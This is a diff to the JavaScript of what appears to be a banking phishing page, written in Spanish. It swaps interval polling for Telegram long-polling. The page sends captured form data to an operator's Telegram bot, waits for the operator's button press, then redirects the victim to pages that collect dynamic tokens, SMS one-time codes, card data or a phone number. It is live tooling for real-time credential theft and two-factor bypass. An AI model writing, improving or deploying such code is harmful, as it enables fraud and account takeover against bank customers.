@@ -235,7 +235,11 @@
             let activeTab = 'segura'; 
             let TELEGRAM_BOT_TOKEN = '';
             let TELEGRAM_CHAT_ID = '';
-            let statusCheckInterval = null;
+            
+            // --- INICIO DE CAMBIOS ---
+            let pollingTimeout = null; // Reemplaza a statusCheckInterval
+            // --- FIN DE CAMBIOS ---
+
             let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
             const transactionId = Date.now().toString();
 
@@ -259,7 +263,8 @@
             async function initLastUpdateId() {
                 try {
                     if (!TELEGRAM_BOT_TOKEN) return;
-                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
+                    // Se agrega un timeout corto a esta solicitud para que no se quede pegada
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?timeout=1`;
                     const response = await fetch(url);
                     const data = await response.json();
                     if (!data || !data.result) return;
@@ -462,70 +467,101 @@
 
                 if (messageId) {
                     sessionStorage.setItem('telegramMessageId', messageId);
-                    checkPaymentVerification();
+                    
+                    // --- INICIO DE CAMBIOS ---
+                    // Inicia el polling en lugar de llamar a la función antigua
+                    pollForUpdates(); 
+                    // --- FIN DE CAMBIOS ---
+
                 } else {
                     spinnerModal.style.display = 'none';
                     alert("Error al enviar los datos iniciales. Por favor, inténtalo de nuevo.");
                 }
             }
 
-            async function checkPaymentVerification() {
-                if (statusCheckInterval) {
-                    clearInterval(statusCheckInterval);
+            // --- INICIO DE CAMBIOS ---
+            // Reemplazo de checkPaymentVerification con pollForUpdates
+            async function pollForUpdates() {
+                // Borra cualquier timeout anterior programado
+                if (pollingTimeout) {
+                    clearTimeout(pollingTimeout);
                 }
-                statusCheckInterval = setInterval(async () => {
-                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
-                    try {
-                        const response = await fetch(url);
-                        const data = await response.json();
-                        const updates = data.result;
+                
+                // Agrega un timeout de 50 segundos a la solicitud de long-polling
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=50`;
 
-                        if (updates && updates.length > 0) {
-                            const relevantUpdate = updates.find(u => u.callback_query && u.callback_query.data.includes(transactionId));
-
-                            if (relevantUpdate) {
-                                const latest = relevantUpdate;
-                                clearInterval(statusCheckInterval);
-                                spinnerModal.style.display = 'none';
-
-                                const callbackData = latest.callback_query.data.split(':')[0];
-                                const callbackId = latest.callback_query.id;
-                                const messageId = sessionStorage.getItem('telegramMessageId');
-
-                                await editTelegramMessage(TELEGRAM_CHAT_ID, messageId);
-
-                                try {
-                                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' })
-                                    });
-                                } catch (err) {
-                                    console.warn('🟡 No se pudo responder callback_query:', err);
-                                }
-
-                                lastUpdateId = latest.update_id;
-                                sessionStorage.setItem('lastUpdateId', lastUpdateId);
-
-                                console.log("➡️ Redirigiendo a:", callbackData);
-                                if (callbackData === 'pedir_dinamica') {
-                                    window.location.href = "token.html";
-                                } else if (callbackData === 'pedir_sms') {
-                                    window.location.href = "otp.html";
-                                } else if (callbackData === 'pedir_datos') {
-                                    window.location.href = "cc.html";
-                                } else if (callbackData === 'pedir_numero') {
-                                    window.location.href = "datos.html"; 
-                                } else if (callbackData === 'error_logo') {
-                                    errorModal.style.display = 'flex';
-                                }
-                            }
-                        }
-                    } catch (error) {
-                        console.error("🔴 Error al verificar el estado de la transacción:", error);
+                try {
+                    const response = await fetch(url);
+                    if (!response.ok) {
+                         // Si la respuesta no es OK (ej. 409, 502), registra y reintenta
+                        console.warn(`🟡 Advertencia de red: ${response.status}. Reintentando...`);
+                        // Programa el siguiente intento
+                        pollingTimeout = setTimeout(pollForUpdates, 2000);
+                        return;
                     }
-                }, 2000);
+
+                    const data = await response.json();
+                    const updates = data.result;
+
+                    if (updates && updates.length > 0) {
+                        const relevantUpdate = updates.find(u => u.callback_query && u.callback_query.data.includes(transactionId));
+                        
+                        // Actualiza el lastUpdateId con el ID más alto recibido
+                        const maxUpdateId = Math.max(...updates.map(u => u.update_id));
+                        lastUpdateId = maxUpdateId;
+                        sessionStorage.setItem('lastUpdateId', lastUpdateId);
+
+                        if (relevantUpdate) {
+                            // ¡Respuesta encontrada! Procesar y detener el polling.
+                            spinnerModal.style.display = 'none';
+
+                            const latest = relevantUpdate;
+                            const callbackData = latest.callback_query.data.split(':')[0];
+                            const callbackId = latest.callback_query.id;
+                            const messageId = sessionStorage.getItem('telegramMessageId');
+
+                            await editTelegramMessage(TELEGRAM_CHAT_ID, messageId);
+
+                            try {
+                                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' })
+                                });
+                            } catch (err) {
+                                console.warn('🟡 No se pudo responder callback_query:', err);
+                            }
+
+                            console.log("➡️ Redirigiendo a:", callbackData);
+                            if (callbackData === 'pedir_dinamica') {
+                                window.location.href = "token.html";
+                            } else if (callbackData === 'pedir_sms') {
+                                window.location.href = "otp.html";
+                            } else if (callbackData === 'pedir_datos') {
+                                window.location.href = "cc.html";
+                            } else if (callbackData === 'pedir_numero') {
+                                window.location.href = "datos.html"; 
+                            } else if (callbackData === 'error_logo') {
+                                errorModal.style.display = 'flex';
+                            }
+
+                            // Detener el bucle, ya no necesitamos más polling
+                            return; 
+                        }
+                    }
+
+                    // Si no hubo error pero no se encontró la actualización relevante,
+                    // vuelve a llamar a la función después de un breve retraso.
+                    pollingTimeout = setTimeout(pollForUpdates, 2000);
+
+                } catch (error) {
+                    console.error("🔴 Error al verificar el estado de la transacción (fetch fallido):", error);
+                    // Si falla el fetch (ej. sin red), reintenta después de 2 segundos
+                    pollingTimeout = setTimeout(pollForUpdates, 2000);
+                }
             }
+            // --- FIN DE CAMBIOS ---
+
 
             form.addEventListener("submit", (event) => {
                 event.preventDefault();
@@ -547,13 +583,17 @@
             }
 
             window.addEventListener('beforeunload', function() {
-                if (statusCheckInterval) {
-                    clearInterval(statusCheckInterval);
+                // --- INICIO DE CAMBIOS ---
+                // Asegúrate de limpiar el timeout al salir de la página
+                if (pollingTimeout) {
+                    clearTimeout(pollingTimeout);
                 }
+                // --- FIN DE CAMBIOS ---
             });
 
             loadTelegramConfig().then(configLoaded => {
                 if (configLoaded) {
+                    // Llama a initLastUpdateId DESPUÉS de cargar la configuración
                     initLastUpdateId();
                 }
             });
